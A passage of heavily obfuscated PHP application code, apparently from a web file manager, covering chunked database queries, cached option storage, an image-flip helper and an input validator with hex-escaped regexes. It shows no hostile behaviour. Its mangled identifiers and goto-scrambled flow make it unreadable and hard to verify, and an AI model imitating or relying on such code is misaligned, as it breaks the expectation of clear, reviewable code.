array_slice($E«ƒƒĞ¿—Å, $AÚç¯«‘Ñ, $EÁ§çÃÀ‹•); if (!is_array($EŠâÄ¿×Õ) || count($EŠâÄ¿×Õ) == 0) { break; } $FÍåã©äšª[$Bùå›àŠƒŞ[263]][$cĞ­çƒ†ˆ][1] = $EŠâÄ¿×Õ; $this->optionsValue($FÍåã©äšª); $fšóà”“÷ += parent::save($A¶Ø¶Üôˆˆ, $BÌ“øÂ«œ); $this->chunkEventCheck(count($EŠâÄ¿×Õ)); } $this->chunkEventSet(); return $fšóà”“÷; goto f„œ³£ï‘è; cóƒ•é’ø: $cĞ­çƒ†ˆ = $this->findWhereField($FÍåã©äšª); if (!$cĞ­çƒ†ˆ) { return parent::save($A¶Ø¶Üôˆˆ, $BÌ“øÂ«œ); } $fšóà”“÷ = 0; goto f‹¦§æ¥Ã; f„œ³£ï‘è: } public function add($AÉ³’ãéÚ = '', $f”†®†ùÏ¼ = array(), $c³ÛÃ¿ííğ = false) { if ($this->addTaskStatus && is_array($AÉ³’ãéÚ)) { $this->addTaskData[] = $AÉ³’ãéÚ; return; } return parent::add($AÉ³’ãéÚ, $f”†®†ùÏ¼, $c³ÛÃ¿ííğ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BÒÒ‚ÍÜ = array()) { goto e ìèãÓ¡; E÷Ï¡ŒÄÎš: $cï¿Ÿ»¿»· = is_array($cï¿Ÿ»¿»·) ? $cï¿Ÿ»¿»· : array(); $B˜‰®èòÍª = null; for ($fàÒÍ¡—ƒÀ = 0; $fàÒÍ¡—ƒÀ < count($cï¿Ÿ»¿»·); $fàÒÍ¡—ƒÀ += $eÕ“ÇãäÎ©) { $DóŠ”›®•ä = array_slice($cï¿Ÿ»¿»·, $fàÒÍ¡—ƒÀ, $eÕ“ÇãäÎ©); if (!is_array($DóŠ”›®•ä) || count($DóŠ”›®•ä) == 0) { break; } $c»ÃÔš™[$cœ…ÕôÆ´Ï[263]][$dñøá»Ÿ×¼][1] = $DóŠ”›®•ä; $this->optionsValue($c»ÃÔš™); $bÍ‚®ï„ÀÎ = parent::select($BÒÒ‚ÍÜ); if (!$bÍ‚®ï„ÀÎ) { continue; } if (is_null($B˜‰®èòÍª)) { $B˜‰®èòÍª = array(); } $B˜‰®èòÍª = array_merge($B˜‰®èòÍª, $bÍ‚®ï„ÀÎ); } goto BÄŸñÅÈ; BÄŸñÅÈ: return $B˜‰®èòÍª; goto fÓ•ÍÕäœ’; CÍ…´šÜ„: $dñøá»Ÿ×¼ = $this->findWhereField($c»ÃÔš™); if (!$dñøá»Ÿ×¼ || isset($c»ÃÔš™[$cœ…ÕôÆ´Ï[280]]) || isset($c»ÃÔš™[$cœ…ÕôÆ´Ï[340]])) { return parent::select($BÒÒ‚ÍÜ); } $cï¿Ÿ»¿»· = $c»ÃÔš™[$cœ…ÕôÆ´Ï[263]][$dñøá»Ÿ×¼][1]; goto E÷Ï¡ŒÄÎš; e ìèãÓ¡: $cœ…ÕôÆ´Ï =& $_SERVER[¦·]; $eÕ“ÇãäÎ© = self::SQL_WHERE_IN_CHUNK; $c»ÃÔš™ = $this->optionsValue(); goto CÍ…´šÜ„; fÓ•ÍÕäœ’: } public function delete($F ·—Ôäæ» = array()) { goto EË‘†Á”Úó; EÌ¢“Ïİ¹: return $cÖ¼†‡»; goto cŸµèš¿; EË‘†Á”Úó: $FÜ†Å‚ïÅ² =& $_SERVER[¦·]; $e‚ÚóÓä·‘ = self::SQL_WHERE_IN_CHUNK; $b¾¸îÍ±’ = $this->optionsValue(); goto AŒŞõ‡øë; AŒŞõ‡øë: $b‡„‘¨ç›ˆ = $this->findWhereField($b¾¸îÍ±’); if (!$b‡„‘¨ç›ˆ) { return parent::delete($F ·—Ôäæ»); } $cÖ¼†‡» = 0; goto c†£‘»çé; c†£‘»çé: $e«ÊÃÒ¦»ë = $b¾¸îÍ±’[$FÜ†Å‚ïÅ²[263]][$b‡„‘¨ç›ˆ][1]; $e«ÊÃÒ¦»ë = is_array($e«ÊÃÒ¦»ë) ? $e«ÊÃÒ¦»ë : array(); for ($F‚ó‘‹Ú‡Ò = 0; $F‚ó‘‹Ú‡Ò < count($e«ÊÃÒ¦»ë); $F‚ó‘‹Ú‡Ò += $e‚ÚóÓä·‘) { $CÜ¢ìë•“ = array_slice($e«ÊÃÒ¦»ë, $F‚ó‘‹Ú‡Ò, $e‚ÚóÓä·‘); if (!is_array($CÜ¢ìë•“) || count($CÜ¢ìë•“) == 0) { break; } $b¾¸îÍ±’[$FÜ†Å‚ïÅ²[263]][$b‡„‘¨ç›ˆ][1] = $CÜ¢ìë•“; $this->optionsValue($b¾¸îÍ±’); $cÖ¼†‡» += parent::delete($F ·—Ôäæ»); } goto EÌ¢“Ïİ¹; cŸµèš¿: } private function findWhereField($cÜ‘í‘Ë«) { $bÖ¼´µ½Å¨ =& $_SERVER[¦·]; $cõ»¯Ï´”Ó = self::SQL_WHERE_IN_CHUNK; if (!is_array($cÜ‘í‘Ë«) || !is_array($cÜ‘í‘Ë«[$bÖ¼´µ½Å¨[263]])) { return !1; } foreach ($cÜ‘í‘Ë«[$bÖ¼´µ½Å¨[263]] as $fÏÛ‡°‰í† => $EÉ™±ˆÌ¿¢) { if (is_array($EÉ™±ˆÌ¿¢) && isset($EÉ™±ˆÌ¿¢[0]) && is_string($EÉ™±ˆÌ¿¢[0]) && strtolower($EÉ™±ˆÌ¿¢[0]) == $bÖ¼´µ½Å¨[7] && is_array($EÉ™±ˆÌ¿¢[1]) && count($EÉ™±ˆÌ¿¢[1]) > $cõ»¯Ï´”Ó) { ignore_timeout(); return $fÏÛ‡°‰í†; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\x6d\117\x70\164\151\x6f\156"; public $field = array(); public function listData($A£çÓ¬ï… = false, $A¨“¯Âò = "\155\x6f\144\151\x66\x79\x54\x69\155\x65", $cÙß„•‡¯â = false) { $C¼×Ÿ­ã°å = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$C¼×Ÿ­ã°å) { return $A£çÓ¬ï… ? null : array(); } if (!$A£çÓ¬ï…) { $C¼×Ÿ­ã°å = array_filter(array_values($C¼×Ÿ­ã°å)); return array_sort_by($C¼×Ÿ­ã°å, $A¨“¯Âò, $cÙß„•‡¯â); } return $C¼×Ÿ­ã°å[$_SERVER[¦·][364] . $A£çÓ¬ï…]; } public function insert($bê­Šç®ˆŞ) { goto bê÷õ™…; aÚŸÀÒÖÕ: $bê­Šç®ˆŞ[$b†à÷‘Áè[107]] = time(); Model($this->modelType)->set($b†à÷‘Áè[365], $bñö÷ŸÑ¤¡, $this->optionType . $b†à÷‘Áè[366]); Model($this->modelType)->set($b†à÷‘Áè[364] . $bñö÷ŸÑ¤¡, $bê­Šç®ˆŞ, $this->optionType); goto F„¢ÎÓ‹ªã; F„¢ÎÓ‹ªã: return $bñö÷ŸÑ¤¡; goto Eå¬Ê‚Èó; bê÷õ™…: $b†à÷‘Áè =& $_SERVER[¦·]; $bê­Šç®ˆŞ = array_field_key($bê­Šç®ˆŞ, $this->field); $bñö÷ŸÑ¤¡ = Model($this->modelType)->get($b†à÷‘Áè[365], $this->optionType . $b†à÷‘Áè[366]); goto D¡–ôõ»É¿; D¡–ôõ»É¿: $bñö÷ŸÑ¤¡ = $bñö÷ŸÑ¤¡ ? $bñö÷ŸÑ¤¡ : 0; $bê­Šç®ˆŞ[$b†à÷‘Áè[367]] = ++$bñö÷ŸÑ¤¡; $bê­Šç®ˆŞ[$b†à÷‘Áè[187]] = time(); goto aÚŸÀÒÖÕ; Eå¬Ê‚Èó: } public function update($eÆ¹Ç¬Ÿ“Ğ, $bŠíŞ‘ÆïÏ) { goto dÁÙ‚¸¬ßÊ; C²¤óŞç‚è: if (!$cÄ·¶¾ì÷â) { return !1; } $bŠíŞ‘ÆïÏ = array_merge($cÄ·¶¾ì÷â, $bŠíŞ‘ÆïÏ); $bŠíŞ‘ÆïÏ[$c…â‹Šã™[107]] = time(); goto Cê‹Îâ; Cê‹Îâ: return Model($this->modelType)->set($c…â‹Šã™[364] . $eÆ¹Ç¬Ÿ“Ğ, $bŠíŞ‘ÆïÏ, $this->optionType); goto CÙ„ÀÑÁÀ³; dÁÙ‚¸¬ßÊ: $c…â‹Šã™ =& $_SERVER[¦·]; $bŠíŞ‘ÆïÏ = array_field_key($bŠíŞ‘ÆïÏ, $this->field); $cÄ·¶¾ì÷â = $this->listData($eÆ¹Ç¬Ÿ“Ğ); goto C²¤óŞç‚è; CÙ„ÀÑÁÀ³: } public function remove($c‡ñ¾§î»ì) { return Model($this->modelType)->remove($_SERVER[¦·][364] . $c‡ñ¾§î»ì, $this->optionType); } public function clear() { $F‰¦‰Çó„® =& $_SERVER[¦·]; Model($this->modelType)->remove($F‰¦‰Çó„®[365], $this->optionType . $F‰¦‰Çó„®[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($CŸÊ­¨Öê…, $AˆÁÙÛÔ†á) { if (!$AˆÁÙÛÔ†á) { return !1; } $cƒËé·Ü´½ = $this->listData(); $cƒËé·Ü´½ = array_to_keyvalue($cƒËé·Ü´½, $CŸÊ­¨Öê…); return isset($cƒËé·Ü´½[$AˆÁÙÛÔ†á]) ? $cƒËé·Ü´½[$AˆÁÙÛÔ†á] : !1; } public function findByName($bØå«È‡§) { return $this->findByKey($_SERVER[¦·][28], $bØå«È‡§); } protected function resetData($eÌ¨‚±˜±è) { $FäóæäÕ· =& $_SERVER[¦·]; $eÌ¨‚±˜±è = is_array($eÌ¨‚±˜±è) ? $eÌ¨‚±˜±è : array(); $AÏ„­‹œÊ” = array(); for ($bÏéØÖÀòÑ = 0; $bÏéØÖÀòÑ < count($eÌ¨‚±˜±è); $bÏéØÖÀòÑ++) { $AÏ„­‹œÊ”[$FäóæäÕ·[364] . $eÌ¨‚±˜±è[$bÏéØÖÀòÑ][$FäóæäÕ·[367]]] = $eÌ¨‚±˜±è[$bÏéØÖÀòÑ]; } return Model($this->modelType)->set($AÏ„­‹œÊ”, !1, $this->optionType); } private function getAutoName($F¸Ë™£¹¹·) { $Eå”ÏÂì¯á = array_to_keyvalue($this->listData(), $_SERVER[¦·][28]); if (!$Eå”ÏÂì¯á || !isset($Eå”ÏÂì¯á[$F¸Ë™£¹¹·])) { return $F¸Ë™£¹¹·; } for ($E“·åÒ³· = 1; $E“·åÒ³· < count($Eå”ÏÂì¯á); $E“·åÒ³·++) { $CÄ¤Õµ²¨­ = $F¸Ë™£¹¹· . "\x28{$E“·åÒ³·}\x29"; if (!isset($Eå”ÏÂì¯á[$CÄ¤Õµ²¨­])) { return $CÄ¤Õµ²¨­; } } return $CÄ¤Õµ²¨­; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($aƒğé¬äï‹ = false, $d¢Ûç¬†çÓ = '', $FÔ†èì¥˜« = false) { goto EŒËÇ«ÛŒ³; EŒËÇ«ÛŒ³: $bššîóŒõŠ =& $_SERVER[¦·]; $a´®µíÀÌ® = $this->cacheGet($d¢Ûç¬†çÓ); $fĞÉÆ´¿¢İ = $this->optionDefault($d¢Ûç¬†çÓ); goto CçÎïš×Ù®; CçÎïš×Ù®: $fĞÉÆ´¿¢İ = is_array($fĞÉÆ´¿¢İ) ? $fĞÉÆ´¿¢İ : array(); if (is_array($a´®µíÀÌ®)) { $a´®µíÀÌ® = array_merge($fĞÉÆ´¿¢İ, $a´®µíÀÌ®); return $aƒğé¬äï‹ ? isset($a´®µíÀÌ®[$aƒğé¬äï‹]) ? $a´®µíÀÌ®[$aƒğé¬äï‹] : null : $a´®µíÀÌ®; } $FÏµéµ†£ = $this->filterWhere(array($bššîóŒõŠ[29] => $d¢Ûç¬†çÓ)); goto B¤ºóÛ¢„; DŸø‰İŞù: $this->cacheSet($d¢Ûç¬†çÓ, $a´®µíÀÌ®); $a´®µíÀÌ® = array_merge($fĞÉÆ´¿¢İ, $a´®µíÀÌ®); return $aƒğé¬äï‹ ? $a´®µíÀÌ®[$aƒğé¬äï‹] : $a´®µíÀÌ®; goto E½­”å˜ÇŠ; B¤ºóÛ¢„: $a´®µíÀÌ® = $this->where($FÏµéµ†£)->select(); $a´®µíÀÌ® = array_to_keyvalue($a´®µíÀÌ®, $bššîóŒõŠ[89], $bššîóŒõŠ[359]); foreach ($a´®µíÀÌ® as $A¬¡Ãœê => $eÈÂÆòÜéš) { if ($FÔ†èì¥˜« || in_array($A¬¡Ãœê, $this->jsonField)) { $a´®µíÀÌ®[$A¬¡Ãœê] = json_decode($eÈÂÆòÜéš, !0); } } goto DŸø‰İŞù; E½­”å˜ÇŠ: } public function set($báÂå•Ê, $A¨†ƒ·è° = false, $F «ŸÁ·ÜÑ = '') { goto dÎØöéºÕœ; dÎØöéºÕœ: $có‰´” ¤” =& $_SERVER[¦·]; $this->cacheRemove($F «ŸÁ·ÜÑ); $aƒµ«ÔŸ½— = array(); goto dèæ½êŞ–ç; dèæ½êŞ–ç: $Eõ™ù‚éÓ = is_array($báÂå•Ê) ? $báÂå•Ê : array($báÂå•Ê => $A¨†ƒ·è°); foreach ($Eõ™ù‚éÓ as $bÅ—¬ÆË’ => $d¯é–œÈÙ·) { if (is_array($d¯é–œÈÙ·)) { $d¯é–œÈÙ· = json_encode_force($d¯é–œÈÙ·); } $this->checkLength($d¯é–œÈÙ·, !1, $this->tableName . $có‰´” ¤”[4] . $báÂå•Ê); $d¯é–œÈÙ· = self::textEncode($d¯é–œÈÙ·); $Eõ™ù‚éÓ = array($có‰´” ¤”[29] => $F «ŸÁ·ÜÑ, $có‰´” ¤”[89] => $bÅ—¬ÆË’, $có‰´” ¤”[359] => $d¯é–œÈÙ·); $aƒµ«ÔŸ½—[] = $this->filterWhere($Eõ™ù‚éÓ); } if (!$aƒµ«ÔŸ½—) { return !0; } goto D®‚¶†¡; D®‚¶†¡: return $this->addAll($aƒµ«ÔŸ½—, array(), !0); goto Eµ†øß’ÁÃ; Eµ†øß’ÁÃ: } protected function optionDefault($b¤º…¥ƒõ  = '') { return !1; } public function setDeep($B¥Šô—‚ê, $d¢óÉ…àÕ = false, $Fš¤²–¼® = '') { $D¡ê‘¿µ© = explode($_SERVER[¦·][91], $B¥Šô—‚ê); $Aøß”åí…£ = $this->get(); array_set_value($Aøß”åí…£, $B¥Šô—‚ê, $d¢óÉ…àÕ); $this->set($D¡ê‘¿µ©[0], $Aøß”åí…£[$D¡ê‘¿µ©[0]], $Fš¤²–¼®); } public function remove($eæ™¿äï, $D«…Ï¶áù = '') { $EÂˆ–èØ¥¶ =& $_SERVER[¦·]; $this->cacheRemove($D«…Ï¶áù); $F«¾˜›Å” = $this->filterWhere(array($EÂˆ–èØ¥¶[89] => $eæ™¿äï, $EÂˆ–èØ¥¶[29] => $D«…Ï¶áù)); if (is_null($eæ™¿äï)) { unset($F«¾˜›Å”[$EÂˆ–èØ¥¶[89]]); } return $this->where($F«¾˜›Å”)->delete(); } public function cacheSet($d‡Òôä³¶Â, $e•ÌêøË‘á = false) { return Cache::set($this->cacheKey($d‡Òôä³¶Â), $e•ÌêøË‘á); } public function cacheGet($d¸£ËÆÌÁ£) { return Cache::get($this->cacheKey($d¸£ËÆÌÁ£)); } public function cacheRemove($aáé¨•¾³) { return Cache::remove($this->cacheKey($aáé¨•¾³)); } protected function filterWhere($b»ø”Ú¦×) { return $b»ø”Ú¦×; } protected function cacheKey($fÖ–œˆ™ö¡) { return $fÖ–œˆ™ö¡; } } goto a¹Ô¨ÅáØµ; a¸ÎŸ½è‚ë: if (!function_exists($_SERVER[¦·][1879])) { define($_SERVER[¦·][1880], 0); define($_SERVER[¦·][1881], 1); define($_SERVER[¦·][1882], 2); function imageflip($FšÙÓñƒ“í, $bŞ©¢ÃåÚ) { switch ($bŞ©¢ÃåÚ) { case IMG_FLIP_HORIZONTAL: $dç÷Ù„ò„ = imagesx($FšÙÓñƒ“í) - 1; $D•÷è­ëâ· = $dç÷Ù„ò„ / 2; $DĞÀ²âÄ¹ = imagesy($FšÙÓñƒ“í); $cˆ¶šñ¤­© = imageistruecolor($FšÙÓñƒ“í) ? imagecreatetruecolor(1, $DĞÀ²âÄ¹) : imagecreate(1, $DĞÀ²âÄ¹); for ($EÚ­¢†ÏéÁ = 0; $EÚ­¢†ÏéÁ < $D•÷è­ëâ·; ++$EÚ­¢†ÏéÁ) { imagecopy($cˆ¶šñ¤­©, $FšÙÓñƒ“í, 0, 0, $EÚ­¢†ÏéÁ, 0, 1, $DĞÀ²âÄ¹); imagecopy($FšÙÓñƒ“í, $FšÙÓñƒ“í, $EÚ­¢†ÏéÁ, 0, $dç÷Ù„ò„ - $EÚ­¢†ÏéÁ, 0, 1, $DĞÀ²âÄ¹); imagecopy($FšÙÓñƒ“í, $cˆ¶šñ¤­©, $dç÷Ù„ò„ - $EÚ­¢†ÏéÁ, 0, 0, 0, 1, $DĞÀ²âÄ¹); } break; case IMG_FLIP_VERTICAL: $c‹æ¢ÅÄÃ” = imagesx($FšÙÓñƒ“í); $D°ƒõáË«È = imagesy($FšÙÓñƒ“í) - 1; $a©É÷ÓØ¶í = $D°ƒõáË«È / 2; $cˆ¶šñ¤­© = imageistruecolor($FšÙÓñƒ“í) ? imagecreatetruecolor($c‹æ¢ÅÄÃ”, 1) : imagecreate($c‹æ¢ÅÄÃ”, 1); for ($A’ÒŒ¬•Ä = 0; $A’ÒŒ¬•Ä < $a©É÷ÓØ¶í; ++$A’ÒŒ¬•Ä) { imagecopy($cˆ¶šñ¤­©, $FšÙÓñƒ“í, 0, 0, 0, $A’ÒŒ¬•Ä, $c‹æ¢ÅÄÃ”, 1); imagecopy($FšÙÓñƒ“í, $FšÙÓñƒ“í, 0, $A’ÒŒ¬•Ä, 0, $D°ƒõáË«È - $A’ÒŒ¬•Ä, $c‹æ¢ÅÄÃ”, 1); imagecopy($FšÙÓñƒ“í, $cˆ¶šñ¤­©, 0, $D°ƒõáË«È - $A’ÒŒ¬•Ä, 0, 0, $c‹æ¢ÅÄÃ”, 1); } break; case IMG_FLIP_BOTH: $c‹æ¢ÅÄÃ” = imagesx($FšÙÓñƒ“í); $DĞÀ²âÄ¹ = imagesy($FšÙÓñƒ“í); $cˆ¶šñ¤­© = imagerotate($FšÙÓñƒ“í, 180, 0); imagecopy($FšÙÓñƒ“í, $cˆ¶šñ¤­©, 0, 0, 0, 0, $c‹æ¢ÅÄÃ”, $DĞÀ²âÄ¹); break; default: return; } imagedestroy($cˆ¶šñ¤­©); } } if (!function_exists($_SERVER[¦·][1883])) { function imagecreatefrombmp($D‰¯Ş±—”) { return ImageGdBMP::load($D‰¯Ş±—”); } } class Input { public static function getArray($C¿ØŠ¾ù“‘) { goto aµÛºëô ; D²²È†Õ: if (count($C‘öİà‰•) > 0) { show_json(implode($a£Ç¿äˆ•¤[1888], $C‘öİà‰•), !1); } return $dÔ†œª¿; goto e‚ÈÒ¸ªÁ´; F‘ßªÉæƒÉ: $C‘öİà‰• = array(); $C½¢ïÎÊ™ = LNG($a£Ç¿äˆ•¤[1884]); foreach ($C¿ØŠ¾ù“‘ as $c¥õî¯ùÎ => $CØÎØ½ ‰ò) { goto EçŞïÍ¨õ; a˜İ°Ö¾ô: if (isset($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1887]]) && !self::check($in[$c¥õî¯ùÎ], $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1887]], $DéÃ‚ó«ÎŒ)) { if (array_key_exists($a£Ç¿äˆ•¤[1886], $CØÎØ½ ‰ò)) { if (!is_null($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]])) { $dÔ†œª¿[$F²²Ó× »Ò] = $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]]; } } else { $C‘öİà‰•[] = $d£¸·ÚÊ‘É; } continue; } $dÔ†œª¿[$F²²Ó× »Ò] = $in[$c¥õî¯ùÎ]; goto Bİ´âØé½ä; fÁÙÈ‚²: if (!array_key_exists($c¥õî¯ùÎ, $in)) { if (array_key_exists($a£Ç¿äˆ•¤[1886], $CØÎØ½ ‰ò)) { if (!is_null($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]])) { $dÔ†œª¿[$F²²Ó× »Ò] = $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]]; } } else { if (isset($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1887]])) { $C‘öİà‰•[] = $d£¸·ÚÊ‘É; } } continue; } if (isset($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1887]]) && $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1887]] == $a£Ç¿äˆ•¤[282]) { $aµŠãá½µï = json_decode($in[$c¥õî¯ùÎ], !0); if (is_array($aµŠãá½µï)) { $dÔ†œª¿[$F²²Ó× »Ò] = $aµŠãá½µï; } else { if (array_key_exists($a£Ç¿äˆ•¤[1886], $CØÎØ½ ‰ò)) { if (!is_null($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]])) { $dÔ†œª¿[$F²²Ó× »Ò] = $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1886]]; } } else { $C‘öİà‰•[] = $d£¸·ÚÊ‘É; } } continue; } $DéÃ‚ó«ÎŒ = _get($CØÎØ½ ‰ò, $a£Ç¿äˆ•¤[1015]); goto a˜İ°Ö¾ô; EçŞïÍ¨õ: $d£¸·ÚÊ‘É = _get($CØÎØ½ ‰ò, $a£Ç¿äˆ•¤[1251], $C½¢ïÎÊ™ . $a£Ç¿äˆ•¤[882] . $c¥õî¯ùÎ); $F²²Ó× »Ò = $c¥õî¯ùÎ; if (isset($CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1885]]) && $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1885]]) { $F²²Ó× »Ò = $CØÎØ½ ‰ò[$a£Ç¿äˆ•¤[1885]]; } goto fÁÙÈ‚²; Bİ´âØé½ä: } goto D²²È†Õ; aµÛºëô : $a£Ç¿äˆ•¤ =& $_SERVER[¦·]; global $in; $dÔ†œª¿ = array(); goto F‘ßªÉæƒÉ; e‚ÈÒ¸ªÁ´: } public static function reg($DÈ«Á¢šŠ¾ = "\162\x65\x71\x75\151\162\145") { static $EªÂ¾Ï˜ØĞ = array("\162\x65\x71\x75\151\x72\x65" => "\56\53", "\156\165\x6d\x62\145\x72" => "\x5c\144\x2b", "\151\x6e\x74\x65\147\145\x72" => "\x5c\144\x2b", "\x68\145\x78" => "\x5b\60\x2d\x39\101\x2d\106\x61\55\146\135\53", "\x69\x6e\164" => "\x5b\x2d\134\x2b\x5d\x3f\x5c\144\53", "\142\157\x6f\154" => "\x30\174\x31", "\146\x6c\157\141\x74" => "\133\x2d\134\53\135\77\x5c\144\x2b\50\134\x2e\134\144\x2b\x29\x3f", "\x65\156\147\154\151\163\x68" => "\133\101\55\132\141\55\172\x20\x5d\x2b", "\143\150\151\156\145\163\x65" => "\133\x5c\170\173\64\145\60\60\x7d\x2d\134\170\x7b\71\x66\141\x35\175\135\x2b", "\150\x61\x73\x43\150\x69\x6e\145\163\x65" => "\x2f\x28\x5b\x5c\170\x7b\x34\145\x30\x30\x7d\x2d\134\170\173\71\x66\x61\65\175\135\53\x29\x2f\165", "\x65\155\x61\x69\x6c" => "\134\167\53\50\x5b\x5c\56\134\55\x5d\134\167\53\51\52\134\100\x5c\167\53\x28\x5b\x5c\x2e\x5c\x2d\135\134\x77\53\51\x2a\134\56\134\x77\x2b", "\x70\150\x6f\x6e\145" => "\x31\x5b\x33\55\71\135\x5c\x64\173\x39\x7d", "\164\145\x6c\x70\150\157\x6e\x65" => "\x28\x5c\50\x5c\144\173\63\x2c\x34\175\134\51\174\134\144\173\x33\54\64\175\x2d\x7c\x5c\163\x29\77\x5c\144\173\x37\54\x31\x34\x7d", "\x75\162\x6c" => "\50\x68\164\x74\160\x7c\146\x74\x70\174\x68\164\x74\160\x73\51\x3a\134\57\x5c\x2f\133\134\167\x5c\x2d\x5f\135\x2b\x28\134\x2e\133\134\x77\134\x2d\137\135\53\51\53\x28\x5b\134\x77\134\x2d\134\x2e\x2c\x40\77\136\75\x25\x26\72\x5c\57\176\134\x2b\x23\x5d\x2a\133\134\x77\134\55\x5c\100\x3f\x5e\75\x25\46\x5c\57\x7e\x5c\53\x23\135\51\77", "\x75\162\154\x46\x75\154\x6c" => "\133\x61\55\x7a\x41\55\172\135\x2b\72\134\57\134\x2f\x5b\136\134\x73\x5d\52", "\x69\160" => "\x28\134\144\x7b\x31\x2c\63\175\134\x2e\51\173\63\175\50\x5c\x64\173\61\54\x33\175\51", "\172\151\x70" => "\x5b\x31\55\71\x5d\134\x64\173\x35\175\x28\x3f\x21\134\x64\51", "\151\x64\x43\141\162\144" => "\50\x5c\144\173\61\x35\x7d\51\174\50\134\144\173\x31\x37\175\50\134\x64\x7c\130\x7c\170\51\51", "\143\157\x6c\x6f\162" => "\x23\50\133\60\55\x39\x41\x2d\106\141\x2d\146\135\173\63\175\x7c\133\x30\55\x39\101\55\x46\x61\55\146\x5d\x7b\x36\175\x29", "\x74\151\155\x65" => "\50\133\60\x2d\x31\x5d\134\144\174\62\x5b\60\55\64\x5d\x29\x3a\133\x30\x2d\x35\x5d\x5c\144", "\144\x61\164\x65" => "\134\x64\x7b\x34\x7d\133\x2d\134\57\135\77\x28\60\x5b\61\55\71\x5d\174\x31\x5b\x30\55\x32\x5d\51\x5b\55\134\57\x5d\77\x28\133\x30\x2d\x32\x5d\134\144\174\63\133\60\x2d\x31\135\x29", "\144\x61\164\x65\x54\151\155\x65" => "\134\x64\x7b\64\x7d\133\55\x5c\x2f\135\77\x28\x30\x5b\61\x2d\71\x5d\174\61\x5b\60\x2d\x32\x5d\51\x5b\x2d\x5c\x2f\135\x3f\x28\133\x30\x2d\62\135\134\x64\174\63\x5b\60\x2d\x31\x5d\x29\134\x73\x2b\x28\133\60\x2d\x31\135\134\144\x7c\x32\133\60\x2d\64\x5d\x29\72\x5b\x30\55\x35\x5d\x5c\x64", "\160\x61\x73\x73\x77\157\162\144" => "\50\x3f\75\x2e\52\134\x64\51\x28\77\75\56\x2a\133\141\x2d\172\x5d\51\50\x3f\75\56\52\133\101\x2d\132\135\x29\x2e\x7b\70\x2c\x32\x30\175", "\x6b\145\171" => "\133\101\55\132\x61\x2d\x7a\60\55\x39\x5f\x5c\55\134\56\x5d\53", "\x6b\145\x79\106\x75\154\x6c" => "\133\x41\x2d\132\141\x2d\x7a\x30\55\71\x5f\134\55\x5c\56\134\163\54\x5d\x2b"); if (!$DÈ«Á¢šŠ¾) { return $EªÂ¾Ï˜ØĞ; } return $EªÂ¾Ï˜ØĞ[$DÈ«Á¢šŠ¾]; } public static function check($DÕ‘¼š­‚Ú, $dƒ„ËÈäËŒ, $B¡‚Ô¢îÙå = null) { $f…ÔÎ©Š® =& $_SERVER[¦·]; switch ($dƒ„ËÈäËŒ) { case $f…ÔÎ©Š®[7]: return in_array($DÕ‘¼š­‚Ú, $B¡‚Ô¢îÙå); break; case $f…ÔÎ©Š®[1889]: return floatval($DÕ‘¼š­‚Ú) > $B¡‚Ô¢îÙå; break; case $f…ÔÎ©Š®[1890]: return floatval($DÕ‘¼š­‚Ú) < $B¡‚Ô¢îÙå; break; case $f…ÔÎ©Š®[325]: return strlen($DÕ‘¼š­‚Ú) >= $B¡‚Ô¢îÙå[0] && strlen($DÕ‘¼š­‚Ú) <= $B¡‚Ô¢îÙå[1]; break; case $f…ÔÎ©Š®[325]: if (is_array($B¡‚Ô¢îÙå)) { return strlen($DÕ‘¼š­‚Ú) >= $B¡‚Ô¢îÙå[0] && strlen($DÕ‘¼š­‚Ú) <= $B¡‚Ô¢îÙå[1]; break; } else { return strlen($DÕ‘¼š­‚Ú) == $B¡‚Ô¢îÙå; break; } case $f…ÔÎ©Š®[321]: return floatval($DÕ‘¼š­‚Ú) >= $B¡‚Ô¢îÙå[0] && floatval($DÕ‘¼š­‚Ú) <= $B¡‚Ô¢îÙå[1]; break; } $D“œÃ¯¿õ = self::reg(!1); $dƒ„ËÈäËŒ = isset($D“œÃ¯¿õ[$dƒ„ËÈäËŒ]) ? $D“œÃ¯¿õ[$dƒ„ËÈäËŒ] : $dƒ„ËÈäËŒ; if (substr($dƒ„ËÈäËŒ, 0, 1) != $f…ÔÎ©Š®[8]) { $dƒ„ËÈäËŒ = $f…ÔÎ©Š®[1891] . $dƒ„ËÈäËŒ . $f…ÔÎ©Š®[1892]; } return preg_match($dƒ„ËÈäËŒ, $DÕ‘¼š­‚Ú) === 1; } public static function get($aòí®¹•ˆù, $A¿Å©ã†¸¹ = null, $bù¡˜¼ºô³ = null, $D¡•ƒÏÁ…… = null) { goto Eî·‰™²‰; aš‹ÆØóâ³: return $fİ¥±¯‘¾[$aòí®¹•ˆù]; goto D˜…Œ‚ÁàÃ; Eî·‰™²‰: $B¬âÈ“ÌÎ =& $_SERVER[¦·]; $eä… ïï£“ = array(); if (!is_null($bù¡˜¼ºô³)) { $eä… ïï£“[$B¬âÈ“ÌÎ[34]] = $bù¡˜¼ºô³; } goto fàëóÌá©Ğ; fàëóÌá©Ğ: if (!is_null($D¡•ƒÏÁ……)) { $eä… ïï£“[$B¬âÈ“ÌÎ[1015]] = $D¡•ƒÏÁ……; } if (!is_null($A¿Å©ã†¸¹)) { $eä… ïï£“[$B¬âÈ“ÌÎ[1887]] = $A¿Å©ã†¸¹; } $fİ¥±¯‘¾ 